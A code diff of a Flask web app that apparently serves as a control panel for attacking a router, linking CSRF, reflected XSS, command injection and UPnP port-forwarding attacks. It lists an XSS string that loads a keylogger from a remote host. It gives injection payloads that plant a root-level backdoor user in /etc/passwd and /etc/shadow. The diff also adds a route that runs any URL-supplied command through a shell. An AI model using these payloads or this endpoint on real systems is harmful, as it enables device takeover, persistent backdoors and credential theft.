@@ -6,6 +6,10 @@ import os
 app = Flask(__name__)
 app.debug=True
 
+upnpc_forward='upnpc -m 172.30.254.2 -a 172.30.254.1 80 80 TCP'
+
+
+
 @app.route('/')
 def root():
     return \
@@ -14,19 +18,32 @@ def root():
     checks("bs4")+\
     '-->'+\
     '<br><a href=/call/sh/iv-wrt.sh>Start Iv-Wrt</a></>\
-    <br><a href=/call/upnpc/%20-m%20172.30.254.2%20-a%2010.254.254.1%2080%2080%20TCP>Poke a hole via upnp</a></>\
+    <!--\
+    <br><a href=/call/upnpc%20-m%20172.30.254.2%20-a%20172.30.254.1%2080%2080%20TCP>Poke a hole via upnp</a></>\
+    -->\
     <br><a href=/csrf/open/80>CSRF:Open Port 80 to the WAN</a></>\
             <br><a href=/reflected_xss>Reflected XSS attack (doesn\'t work in chrome)</a></>\
             <br><a href=/command_injection_ls>Command Injection: ls</a></>\
             <br></>\
             <br>The XSS attack string to call a remote payload should look like this: <xmp><script src=//172&#46;30&#46;254&#46;2/s></script>.</xmp> That points to /s which is the simple alert(1) script. For the keylogger, you should point to <a href=/t>/t</a>, so it would look like this: <xmp><script src=//172&#46;30&#46;254&#46;2/t></script></xmp></>\
-            <br><xmp>To check for an IGD use "upnpc -m <iface> -s" and to open port 80 to the WAN use "upnpc -m <iface> -a <ip> <port> <external_port> (TCP|UDP)." For our purposes that\'ll look like: upnpc -m 172.30.254.2 -a 10.254.254.1 80 80 TCP</xmp></br>\
+            <br><xmp>To check for an IGD use "upnpc -m <iface> -s" and to open port 80 to the WAN use "upnpc -m <iface> -a <ip> <port> <external_port> (TCP|UDP)." For our purposes that\'ll look like: upnpc -m 172.30.254.2 -a 172.30.254.1 80 80 TCP</xmp></br>\
             <br>/etc/passwd command injection backdoor implant:</br><br>;echo ruser:x:0:0:rservice_default:`echo $PWD |cut -c1`tmp:`echo $PWD |cut -c1`bin`echo $PWD |cut -c1`ash >> `echo $PWD |cut -c1`etc`echo $PWD |cut -c1`passwd</br>\
             <br>/etc/shadow command injection backdoor implant:</br><br>;echo ruser:\'$\'1\'$\'4Q5Z0BuW\'$\'9UI5yWhHR3.NWxjuDR2Cs`echo $PWD|cut -c1`:16528:0:99999:7::: >> `echo $PWD|cut -c1`etc`echo $PWD|cut -c1`shadow<br>\
 '
 
-@app.route('/call/<command>/<flags>')
-def mycall(command, flags):
+@app.route('/call/<command>/')
+def no_opts_call(command):
+    result = ''
+   # try:
+    call([command], shell=True)
+   # except:
+   #     result += "command not run"
+   #else:
+   #     result += "ran "+command
+    return result
+
+@app.route('/call/<command>/<flags>/')
+def mycall(command, flags ):
     result = ''
     try:
         call([command, flags])
